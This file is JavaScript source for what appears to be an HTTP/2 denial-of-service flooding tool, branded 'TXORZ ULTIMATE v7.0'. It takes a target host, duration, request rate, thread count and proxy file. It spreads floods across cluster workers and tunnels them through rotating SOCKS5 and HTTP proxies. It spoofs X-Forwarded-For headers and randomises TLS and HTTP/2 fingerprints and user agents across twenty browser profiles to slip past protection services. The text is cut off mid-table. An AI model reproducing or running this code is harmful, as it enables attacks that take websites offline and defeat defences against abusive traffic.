const net = require("net");
const http2 = require("http2");
const http = require('http');
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const socks = require('socks').SocksClient;
const crypto = require("crypto");
const HPACK = require('hpack');
const fs = require("fs");
const os = require("os");
const colors = require("colors");
const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers = "GREASE:" + [
    defaultCiphers[2],
    defaultCiphers[1],
    defaultCiphers[0],
    ...defaultCiphers.slice(3),
    "TLS_AES_256_GCM_SHA384",
    "TLS_CHACHA20_POLY1305_SHA256",
    "TLS_AES_128_GCM_SHA256",
    "TLS_AES_128_CCM_SHA256",
    "TLS_AES_128_CCM_8_SHA256",
    "TLS_SM4_GCM_SM3",
    "TLS_SM4_CCM_SM3",
    "ECDHE-ECDSA-AES256-GCM-SHA384",
    "ECDHE-RSA-AES256-GCM-SHA384",
    "ECDHE-ECDSA-CHACHA20-POLY1305",
    "ECDHE-RSA-CHACHA20-POLY1305",
    "ECDHE-ECDSA-AES128-GCM-SHA256",
    "ECDHE-RSA-AES128-GCM-SHA256",
    "DHE-RSA-AES256-GCM-SHA384",
    "DHE-RSA-CHACHA20-POLY1305",
    "DHE-RSA-AES128-GCM-SHA256",
    "ECDHE-ECDSA-AES256-SHA384",
    "ECDHE-RSA-AES256-SHA384",
    "ECDHE-ECDSA-AES128-SHA256",
    "ECDHE-RSA-AES128-SHA256",
    "DHE-RSA-AES256-SHA256",
    "DHE-RSA-AES128-SHA256",
    "AES256-GCM-SHA384",
    "AES128-GCM-SHA256",
    "AES256-SHA256",
    "AES128-SHA256",
    "AES256-SHA",
    "AES128-SHA",
    "CAMELLIA256-SHA256",
    "CAMELLIA128-SHA256",
    "SEED-SHA",
    "IDEA-CBC-SHA",
    "DES-CBC3-SHA",
    "RC4-SHA",
    "RC4-MD5",
    "PSK-AES256-CBC-SHA",
    "PSK-AES128-CBC-SHA",
    "PSK-3DES-EDE-CBC-SHA",
    "KRB5-DES-CBC3-SHA",
    "KRB5-DES-CBC3-MD5",
    "KRB5-RC4-SHA",
    "KRB5-RC4-MD5",
    "EXP-EDH-RSA-DES-CBC-SHA",
    "EXP-EDH-DSS-DES-CBC-SHA",
    "EXP-ADH-RC4-MD5",
    "EXP-ADH-DES-CBC-SHA"
].join(":");
function encodeSettings(settings) {
    const data = Buffer.alloc(6 * settings.length);
    settings.forEach(([id, value], i) => {
        data.writeUInt16BE(id, i * 6);
        data.writeUInt32BE(value, i * 6 + 2);
    });
    return data;
}

function encodeFrame(streamId, type, payload = "", flags = 0) {
    const frame = Buffer.alloc(9 + payload.length);
    frame.writeUInt32BE(payload.length << 8 | type, 0);
    frame.writeUInt8(flags, 4);
    frame.writeUInt32BE(streamId, 5);
    if (payload.length > 0) frame.set(payload, 9);
    return frame;
}

function getRandomInt(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

function randomIntn(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}
 function randomElement(elements) {
     return elements[randomIntn(0, elements.length)];
 }
    
  function randstr(length) {
		const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
		let result = "";
		const charactersLength = characters.length;
		for (let i = 0; i < length; i++) {
			result += characters.charAt(Math.floor(Math.random() * charactersLength));
		}
		return result;
	}
  function generateRandomString(minLength, maxLength) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'; 
 const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
 const randomStringArray = Array.from({ length }, () => {
   const randomIndex = Math.floor(Math.random() * characters.length);
   return characters[randomIndex];
 });

 return randomStringArray.join('');
}
    const cplist = [
  "TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:TLS_AES_128_CCM_SHA256:TLS_AES_128_CCM_8_SHA256:TLS_SM4_GCM_SM3:TLS_SM4_CCM_SM3",
  "ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256",
  "DHE-RSA-AES256-GCM-SHA384:DHE-RSA-CHACHA20-POLY1305:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-SHA256:DHE-RSA-AES128-SHA256:DHE-DSS-AES256-GCM-SHA384:DHE-DSS-AES128-GCM-SHA256",
  "AES256-GCM-SHA384:AES128-GCM-SHA256:AES256-SHA256:AES128-SHA256:CAMELLIA256-SHA256:CAMELLIA128-SHA256:SEED-SHA:IDEA-CBC-SHA",
  "ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES256-SHA:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES128-SHA",
  "RC4-SHA:RC4-MD5:DES-CBC3-SHA:DES-CBC-SHA:EDH-RSA-DES-CBC3-SHA:EDH-DSS-DES-CBC3-SHA:EXP-EDH-RSA-DES-CBC-SHA:EXP-EDH-DSS-DES-CBC-SHA",
  "PSK-AES256-CBC-SHA:PSK-AES128-CBC-SHA:PSK-3DES-EDE-CBC-SHA:PSK-RC4-SHA:KRB5-DES-CBC3-SHA:KRB5-DES-CBC3-MD5:KRB5-RC4-SHA:KRB5-RC4-MD5"
 ];
 var cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))];
  const ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'];
  const ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID', 'ERR_SOCKET_BAD_PORT'];
process.on('uncaughtException', function(e) {
	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('unhandledRejection', function(e) {
	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('warning', e => {
	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).setMaxListeners(0);
 require("events").EventEmitter.defaultMaxListeners = 0;
 const sigalgs = [
     "ecdsa_secp256r1_sha256",
          "rsa_pss_rsae_sha256",
          "rsa_pkcs1_sha256",
          "ecdsa_secp384r1_sha384",
          "rsa_pss_rsae_sha384",
          "rsa_pkcs1_sha384",
          "rsa_pss_rsae_sha512",
          "rsa_pkcs1_sha512",
          "ed25519",
          "ed448",
          "ecdsa_secp521r1_sha512",
          "dsa_sha256",
          "dsa_sha384",
          "dsa_sha512",
          "rsa_pss_pss_sha256",
          "rsa_pss_pss_sha384",
          "rsa_pss_pss_sha512",
          "ecdsa_sha1",
          "rsa_pkcs1_sha1",
          "dsa_sha1",
          "rsa_md5",
          "dsa_md5",
          "ecdsa_sha224",
          "rsa_sha224",
          "dsa_sha224",
          "ecdsa_sha256",
          "ecdsa_sha384",
          "ecdsa_sha512",
          "gost2012_256",
          "gost2012_512",
          "sm2sig_sm3"
] 
  let SignalsList = sigalgs.join(':')
const ecdhCurve = "GREASE:X25519:x25519:P-256:P-384:P-521:X448:brainpoolP256r1:brainpoolP384r1:brainpoolP512r1:secp256k1:ffdhe2048:ffdhe3072:ffdhe4096:ffdhe6144:ffdhe8192:sect163k1:sect163r1:sect163r2:sect193r1:sect193r2:sect233k1:sect233r1:sect239k1:sect283k1:sect283r1:sect409k1:sect409r1:sect571k1:sect571r1";
const secureOptions = 
 crypto.constants.SSL_OP_NO_SSLv2 |
 crypto.constants.SSL_OP_NO_SSLv3 |
 crypto.constants.SSL_OP_NO_TLSv1 |
 crypto.constants.SSL_OP_NO_TLSv1_1 |
 crypto.constants.SSL_OP_NO_TLSv1_3 |
 crypto.constants.ALPN_ENABLED |
 crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
 crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
 crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
 crypto.constants.SSL_OP_COOKIE_EXCHANGE |
 crypto.constants.SSL_OP_PKCS1_CHECK_1 |
 crypto.constants.SSL_OP_PKCS1_CHECK_2 |
 crypto.constants.SSL_OP_SINGLE_DH_USE |
 crypto.constants.SSL_OP_SINGLE_ECDH_USE |
 crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION |
 crypto.constants.SSL_OP_PRIORITIZE_CHACHA |
 crypto.constants.SSL_OP_NO_COMPRESSION |
 crypto.constants.SSL_OP_ALLOW_NO_DHE_KEX |
 crypto.constants.SSL_OP_DONT_INSERT_EMPTY_FRAGMENTS |
 crypto.constants.SSL_OP_NO_RENEGOTIATION |
 crypto.constants.SSL_OP_IGNORE_UNEXPECTED_EOF |
 crypto.constants.SSL_OP_NO_TICKET |
 crypto.constants.SSL_OP_NO_QUERY_MTU |
 crypto.constants.SSL_OP_COPY_PREFER_SERVER_CIPHERS;
 if (process.argv.length < 7){console.log(`Usage: node TXORZ-EWE [host] [time] [rps] [thread] [proxyfile]`); process.exit();}
 const secureProtocol = "TLS_method";
 const headers = {};
 
 const secureContextOptions = {
     ciphers: ciphers,
     sigalgs: SignalsList,
     honorCipherOrder: true,
     secureOptions: secureOptions,
     secureProtocol: secureProtocol
 };
 
 const secureContext = tls.createSecureContext(secureContextOptions);
 const args = {
     target: process.argv[2],
     time: ~~process.argv[3],
     Rate: ~~process.argv[4],
     threads: ~~process.argv[5],
     proxyFile: process.argv[6],
 }
 
 var proxies = readLines(args.proxyFile);
 const parsedTarget = url.parse(args.target); 
 class NetSocket {
     constructor(){}
 
     async SOCKS5(options, callback) {

      const address = options.address.split(':');
      socks.createConnection({
        proxy: {
          host: options.host,
          port: options.port,
          type: 5
        },
        command: 'connect',
        destination: {
          host: address[0],
          port: +address[1]
        }
      }, (error, info) => {
        if (error) {
          return callback(undefined, error);
        } else {
          return callback(info.socket, undefined);
        }
      });
     }
  HTTP(options, callback) {
     const parsedAddr = options.address.split(":");
     const addrHost = parsedAddr[0];
     const payload = `CONNECT ${options.address}:443 HTTP/1.1\r\nHost: ${options.address}:443\r\nProxy-Connection: Keep-Alive\r\nUser-Agent: Mozilla/5.0\r\nProxy-Authorization: basic ${randstr(20)}\r\nX-Forwarded-For: ${getRandomInt(1,255)}.${getRandomInt(1,255)}.${getRandomInt(1,255)}.${getRandomInt(1,255)}\r\nVia: 1.1 ${randstr(8)}\r\n\r\n`;
     const buffer = new Buffer.from(payload);
     const connection = net.connect({
        host: options.host,
        port: options.port,
    });

    connection.setTimeout(options.timeout * 100000);
    connection.setKeepAlive(true, 100000);
    connection.setNoDelay(true)
    connection.on("connect", () => {
       connection.write(buffer);
   });

   connection.on("data", chunk => {
       const response = chunk.toString("utf-8");
       const isAlive = response.includes("HTTP/1.1 200") || response.includes("200 Connection established") || response.includes("HTTP/1.0 200") || response.includes("HTTP/1.1 407") || response.includes("HTTP/1.1 302");
       if (isAlive === false) {
           connection.destroy();
           return callback(undefined, "error: invalid response from proxy server");
       }
       return callback(connection, undefined);
   });

   connection.on("timeout", () => {
       connection.destroy();
       return callback(undefined, "error: timeout exceeded");
   });

}
}


 const Socker = new NetSocket();
 
 function readLines(filePath) {
     return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
 }
 const MAX_RAM_PERCENTAGE = 95;
const RESTART_DELAY = 1000;

 if (cluster.isMaster) { 
 console.clear();
    console.log(`╔══════════════════════════════════════════════════════════╗`.rainbow);
    console.log(`║                  TXORZ ULTIMATE v7.0                    ║`.red);
    console.log(`║              HYPER-GACOR HTTP/2 FLOODER                ║`.yellow);
    console.log(`╚══════════════════════════════════════════════════════════╝`.rainbow);
    console.log(`Target: `.red + process.argv[2].white);
    console.log(`Time: `.red + process.argv[3].white);
    console.log(`Rate: `.red + process.argv[4].white);
    console.log(`Thread: `.red + process.argv[5].white);
    console.log(`ProxyFile: `.red + process.argv[6].white);
    console.log(`Ciphers: ${ciphers.split(':').length} variants`.magenta);
    console.log(`ECDH Curves: ${ecdhCurve.split(':').length} curves`.cyan);
    console.log(`Signature Algs: ${sigalgs.length} algorithms`.green);
    console.log(`--------------------------------------------`.gray);
    
    const restartScript = () => {
        for (const id in cluster.workers) {
            cluster.workers[id].kill();
        }

        setTimeout(() => {
            for (let counter = 1; counter <= args.threads; counter++) {
                cluster.fork();
            }
        }, RESTART_DELAY);
    };

    const handleRAMUsage = () => {
        const totalRAM = os.totalmem();
        const usedRAM = totalRAM - os.freemem();
        const ramPercentage = (usedRAM / totalRAM) * 100;

        if (ramPercentage >= MAX_RAM_PERCENTAGE) {
            restartScript();
        }
    };
	setInterval(handleRAMUsage, 5000);
	
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
} else {
    process.env.UV_THREADPOOL_SIZE = 128;
    process.env.NODE_OPTIONS = "--max-old-space-size=8192";
    setInterval(runFlooder,0)
}
  function runFlooder() {
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");
    const parsedPort = parsedTarget.protocol == "https:" ? "443" : "80";
function randstr(length) {
    const characters = "0123456789";
    let result = "";
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
};
const browsers = ["chrome", "safari", "brave", "firefox", "mobile", "opera", "operagx", "edge", "vivaldi", "samsung", "ucbrowser", "duckduckgo", "yandex", "maxthon", "coccoc", "whale", "puffin", "tor", "epic", "waterfox"];
const getRandomBrowser = () => {
    const randomIndex = Math.floor(Math.random() * browsers.length);
    return browsers[randomIndex];
};

const transformSettings = (settings) => {
    const settingsMap = {
        "SETTINGS_HEADER_TABLE_SIZE": 0x1,
        "SETTINGS_ENABLE_PUSH": 0x2,
        "SETTINGS_MAX_CONCURRENT_STREAMS": 0x3,
        "SETTINGS_INITIAL_WINDOW_SIZE": 0x4,
        "SETTINGS_MAX_FRAME_SIZE": 0x5,
        "SETTINGS_MAX_HEADER_LIST_SIZE": 0x6
    };
    return settings.map(([key, value]) => [settingsMap[key], value]);
};

const h2Settings = (browser) => {
    const settings = {
        chrome: [["SETTINGS_HEADER_TABLE_SIZE", 65536], ["SETTINGS_ENABLE_PUSH", false], ["SETTINGS_MAX_CONCURRENT_STREAMS", 1000], ["SETTINGS_INITIAL_WINDOW_SIZE", 16777215], ["SETTINGS_MAX_FRAME_SIZE", 16384], ["SETTINGS_MAX_HEADER_LIST_SIZE", 262144]],
        firefox: [["SETTINGS_HEADER_TABLE_SIZE", 65536], ["SETTINGS_ENABLE_PUSH", false], ["SETTINGS_MAX_CONCURRENT_STREAMS", 250], ["SETTINGS_INITIAL_WINDOW_SIZE", 16777215], ["SETTINGS_MAX_FRAME_SIZE", 16384], ["SETTINGS_MAX_HEADER_LIST_SIZE", 262144]],
        safari: [["SETTINGS_HEADER_TABLE_SIZE", 4096], ["SETTINGS_ENABLE_PUSH", false], ["SETTINGS_MAX_CONCURRENT_STREAMS", 100], ["SETTINGS_INITIAL_WINDOW_SIZE", 16777215], ["SETTINGS_MAX_FRAME_SIZE", 16384], ["SETTINGS_MAX_HEADER_LIST_SIZE", 262144]],
        mobile: [["SETTINGS_HEADER_TABLE_SIZE", 65536], ["SETTINGS_ENABLE_PUSH", false], ["SETTINGS_MAX_CONCURRENT_STREAMS", 500], ["SETTINGS_INITIAL_WINDOW_SIZE", 16777215], ["SETTINGS_MAX_FRAME_SIZE", 16384], ["SETTINGS_MAX_HEADER_LIST_SIZE", 262144]],
        opera: [["SETTINGS_HEADER_TABLE_SIZE", 65536], ["SETTINGS_ENABLE_PUSH", false], ["SETTINGS_MAX_CONCURRENT_STREAMS", 1000], ["SETTINGS_INITIAL_WINDOW_SIZE", 16777215], ["SETTINGS_MAX_FRAME_SIZE", 16384], ["SETTINGS_MAX_HEADER_LIST_SIZE", 262144]],
        operagx: [["SETTINGS_HEADER_TABLE_SIZE", 65536], ["SETTINGS_ENABLE_PUSH", false], ["SETTINGS_MAX_CONCURRENT_STREAMS", 1000], ["SETTINGS_INITIAL_WINDOW_SIZE", 16777215], ["SETTINGS_MAX_FRAME_SIZE", 16384], ["SETTINGS_MAX_HEADER_LIST_SIZE", 262144]],
        brave: [["SETTINGS_HEADER_TABLE_SIZE", 65536], ["SETTINGS_ENABLE_PUSH", false], ["SETTINGS_MAX_CONCURRENT_STREAMS", 1000], ["SETTINGS_INITIAL_WINDOW_SIZE", 16777215], ["SETTINGS_MAX_FRAME_SIZE", 16384], ["SETTINGS_MAX_HEADER_LIST_SIZE", 262144]],
        edge: [["SETTINGS_HEADER_TABLE_SIZE", 65536], ["SETTINGS_ENABLE_PUSH", false], ["SETTINGS_MAX_CONCURRENT_STREAMS", 1000], ["SETTINGS_INITIAL_WINDOW_SIZE", 16777215], ["SETTINGS_MAX_FRAME_SIZE", 16384], ["SETTINGS_MAX_HEADER_LIST_SIZE", 262144]],
        vivaldi: [["SETTINGS_HEADER_TABLE_SIZE", 65536], ["SETTINGS_ENABLE_PUSH", false], ["SETTINGS_MAX_CONCURRENT_STREAMS", 1000], ["SETTINGS_INITIAL_WINDOW_SIZE", 16777215], ["SETTINGS_MAX_FRAME_SIZE", 16384], ["SETTINGS_MAX_HEADER_LIST_SIZE", 262144]],
        samsung: [["SETTINGS_HEADER_TABLE_SIZE", 65536], ["SETTINGS_ENABLE_PUSH", false], ["SETTINGS_MAX_CONCURRENT_STREAMS", 500], ["SETTINGS_INITIAL_WINDOW_SIZE", 16777215], ["SETTINGS_MAX_FRAME_SIZE", 16384], ["SETTINGS_MAX_HEADER_LIST_SIZE", 262144]],
        ucbrowser: [["SETTINGS_HEADER_TABLE_SIZE", 65536], ["SETTINGS_ENABLE_PUSH", false], ["SETTINGS_MAX_CONCURRENT_STREAMS", 500], ["SETTINGS_INITIAL_WINDOW_SIZE", 16777215], ["SETTINGS_MAX_FRAME_SIZE", 16384], ["SETTINGS_MAX_HEADER_LIST_SIZE", 262144]],
        duckduckgo: [["SETTINGS_HEADER_TABLE_SIZE", 65536], ["SETTINGS_ENABLE_PUSH", false], ["SETTINGS_MAX_CONCURRENT_STREAMS", 500], ["SETTINGS_INITIAL_WINDOW_SIZE", 16777215], ["SETTINGS_MAX_FRAME_SIZE", 16384], ["SETTINGS_MAX_HEADER_LIST_SIZE", 262144]],
        yandex: [["SETTINGS_HEADER_TABLE_SIZE", 65536], ["SETTINGS_ENABLE_PUSH", false], ["SETTINGS_MAX_CONCURRENT_STREAMS", 1000], ["SETTINGS_INITIAL_WINDOW_SIZE", 16777215], ["SETTINGS_MAX_FRAME_SIZE", 16384], ["SETTINGS_MAX_HEADER_LIST_SIZE", 262144]],
        maxthon: [["SETTINGS_HEADER_TABLE_SIZE", 65536], ["SETTINGS_ENABLE_PUSH", false], ["SETTINGS_MAX_CONCURRENT_STREAMS", 500], ["SETTINGS_INITIAL_WINDOW_SIZE", 16777215], ["SETTINGS_MAX_FRAME_SIZE", 16384], ["SETTINGS_MAX_HEADER_LIST_SIZE", 262144]],
        coccoc: [["SETTINGS_HEADER_TABLE_SIZE", 65536], ["SETTINGS_ENABLE_PUSH", false], ["SETTINGS_MAX_CONCURRENT_STREAMS", 1000], ["SETTINGS_INITIAL_WINDOW_SIZE", 16777215], ["SETTINGS_MAX_FRAME_SIZE", 16384], ["SETTINGS_MAX_HEADER_LIST_SIZE", 262144]],
        whale: [["SETTINGS_HEADER_TABLE_SIZE", 65536], ["SETTINGS_ENABLE_PUSH", false], ["SETTINGS_MAX_CONCURRENT_STREAMS", 1000], ["SETTINGS_INITIAL_WINDOW_SIZE", 16777215], ["SETTINGS_MAX_FRAME_SIZE", 16384], ["SETTINGS_MAX_HEADER_LIST_SIZE", 262144]],
        puffin: [["SETTINGS_HEADER_TABLE_SIZE", 65536], ["SETTINGS_ENABLE_PUSH", false], ["SETTINGS_MAX_CONCURRENT_STREAMS", 500], ["SETTINGS_INITIAL_WINDOW_SIZE", 16777215], ["SETTINGS_MAX_FRAME_SIZE", 16384], ["SETTINGS_MAX_HEADER_LIST_SIZE", 262144]],
        tor: [["SETTINGS_HEADER_TABLE_SIZE", 65536], ["SETTINGS_ENABLE_PUSH", false], ["SETTINGS_MAX_CONCURRENT_STREAMS", 500], ["SETTINGS_INITIAL_WINDOW_SIZE", 16777215], ["SETTINGS_MAX_FRAME_SIZE", 16384], ["SETTINGS_MAX_HEADER_LIST_SIZE", 262144]],
        epic: [["SETTINGS_HEADER_TABLE_SIZE", 65536], ["SETTINGS_ENABLE_PUSH", false], ["SETTINGS_MAX_CONCURRENT_STREAMS", 1000], ["SETTINGS_INITIAL_WINDOW_SIZE", 16777215], ["SETTINGS_MAX_FRAME_SIZE", 16384], ["SETTINGS_MAX_HEADER_LIST_SIZE", 262144]],
        waterfox: [["SETTINGS_HEADER_TABLE_SIZE", 65536], ["SETTINGS_ENABLE_PUSH", false], ["SETTINGS_MAX_CONCURRENT_STREAMS", 250], ["SETTINGS_INITIAL_WINDOW_SIZE", 16777215], ["SETTINGS_MAX_FRAME_SIZE", 16384], ["SETTINGS_MAX_HEADER_LIST_SIZE", 262144]]
    };
    return Object.fromEntries(settings[browser] || settings.chrome);
};
const generateHeaders = (browser) => {
    const versions = {
    chrome: { min: 115, max: 140 },
    safari: { min: 14, max: 20 },
    brave: { min: 115, max: 140 },
    firefox: { min: 99, max: 130 },
    mobile: { min: 85, max: 125 },
    opera: { min: 70, max: 110 },
    operagx: { min: 70, max: 110 },
    edge: { min: 115, max: 135 },
    vivaldi: { min: 115, max: 135 },
    samsung: { min: 85, max: 120 },
    ucbrowser: { min: 12, max: 16 },
    duckduckgo: { min: 12, max: 18 },
    yandex: { min: 21, max: 26 },
    maxthon: { min: 5, max: 8 },
    coccoc: { min: 85, max: 110 },
    whale: { min: 1, max: 3 },
    puffin: { min: 9, max: 12 },
    tor: { min: 10, max: 13 },
    epic: { min: 90, max: 115 },
    waterfox: { min: 2022, max: 2024 }
};

    const version = Math.floor(Math.random() * (versions[browser].max - versions[browser].min + 1)) + versions[browser].min;
    
    const userAgents = {
    chrome: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(115 + Math.random() * 25)}.0.${Math.floor(Math.random() * 9999)}.${Math.floor(Math.random() * 999)} Safari/537.36`,
    firefox: `Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:${Math.floor(99 + Math.random() * 31)}.0) Gecko/20100101 Firefox/${Math.floor(99 + Math.random() * 31)}.0`,
    safari: `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_${Math.floor(12 + Math.random() * 9)}_${Math.floor(0 + Math.random() * 9)}) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/${Math.floor(12 + Math.random() * 9)}.0 Safari/605.1.15`,
    opera: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(115 + Math.random() * 25)}.0.${Math.floor(Math.random() * 9999)}.${Math.floor(Math.random() * 999)} Safari/537.36 OPR/${Math.floor(90 + Math.random() * 20)}.0.${Math.floor(Math.random() * 9999)}.${Math.floor(Math.random() * 999)}`,
    operagx: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(115 + Math.random() * 25)}.0.${Math.floor(Math.random() * 9999)}.${Math.floor(Math.random() * 999)} Safari/537.36 OPR/${Math.floor(90 + Math.random() * 20)}.0.${Math.floor(Math.random() * 9999)}.${Math.floor(Math.random() * 999)} (Edition GX)`,
    brave: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(115 + Math.random() * 25)}.0.${Math.floor(Math.random() * 9999)}.${Math.floor(Math.random() * 999)} Safari/537.36 Brave/${Math.floor(1 + Math.random() * 7)}.${Math.floor(0 + Math.random() * 10)}.${Math.floor(0 + Math.random() * 999)}`,
    mobile: `Mozilla/5.0 (Linux; Android ${Math.floor(10 + Math.random() * 7)}; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(115 + Math.random() * 25)}.0.${Math.floor(Math.random() * 9999)}.${Math.floor(Math.random() * 999)} Mobile Safari/537.36`,
    edge: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(115 + Math.random() * 25)}.0.${Math.floor(Math.random() * 9999)}.${Math.floor(Math.random() * 999)} Safari/537.36 Edg/${Math.floor(115 + Math.random() * 25)}.0.${Math.floor(Math.random() * 9999)}.${Math.floor(Math.random() * 999)}`,
    vivaldi: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(115 + Math.random() * 25)}.0.${Math.floor(Math.random() * 9999)}.${Math.floor(Math.random() * 999)} Safari/537.36 Vivaldi/${Math.floor(5 + Math.random() * 7)}.${Math.floor(0 + Math.random() * 10)}`,
    samsung: `Mozilla/5.0 (Linux; Android ${Math.floor(10 + Math.random() * 7)}; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/${Math.floor(15 + Math.random() * 7)}.0 Chrome/${Math.floor(115 + Math.random() * 25)}.0.${Math.floor(Math.random() * 9999)}.${Math.floor(Math.random() * 999)} Mobile Safari/537.36`,
    ucbrowser: `Mozilla/5.0 (Linux; U; Android ${Math.floor(10 + Math.random() * 7)}; en-US; SM-G991B) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/${Math.floor(12 + Math.random() * 5)}.0.0 U3/0.8.0 Mobile Safari/534.30`,
    duckduckgo: `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_${Math.floor(12 + Math.random() * 9)}_${Math.floor(0 + Math.random() * 9)}) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/${Math.floor(12 + Math.random() * 9)}.0 DuckDuckGo/7 Safari/605.1.15`,
    yandex: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(115 + Math.random() * 25)}.0.${Math.floor(Math.random() * 9999)}.${Math.floor(Math.random() * 999)} YaBrowser/${Math.floor(21 + Math.random() * 6)}.${Math.floor(0 + Math.random() * 10)}.0 Safari/537.36`,
    maxthon: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Maxthon/${Math.floor(5 + Math.random() * 4)}.${Math.floor(0 + Math.random() * 10)}.${Math.floor(0 + Math.random() * 999)} Chrome/${Math.floor(115 + Math.random() * 25)}.0.${Math.floor(Math.random() * 9999)}.${Math.floor(Math.random() * 999)} Safari/537.36`,
    coccoc: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) CocCoc/${Math.floor(85 + Math.random() * 25)}.0 Chrome/${Math.floor(115 + Math.random() * 25)}.0.${Math.floor(Math.random() * 9999)}.${Math.floor(Math.random() * 999)} Safari/537.36`,
    whale: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(115 + Math.random() * 25)}.0.${Math.floor(Math.random() * 9999)}.${Math.floor(Math.random() * 999)} Safari/537.36 Whale/${Math.floor(1 + Math.random() * 3)}.${Math.floor(0 + Math.random() * 10)}.${Math.floor(0 + Math.random() * 999)}`,
    puffin: `Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(115 + Math.random() * 25)}.0.${Math.floor(Math.random() * 9999)}.${Math.floor(Math.random() * 999)} Safari/537.36 Puffin/${Math.floor(9 + Math.random() * 4)}.${Math.floor(0 + Math.random() * 10)}.${Math.floor(0 + Math.random() * 99)}`,
    tor: `Mozilla/5.0 (Windows NT 10.0; rv:${Math.floor(91 + Math.random() * 20)}.0) Gecko/20100101 Firefox/${Math.floor(91 + Math.random() * 20)}.0`,
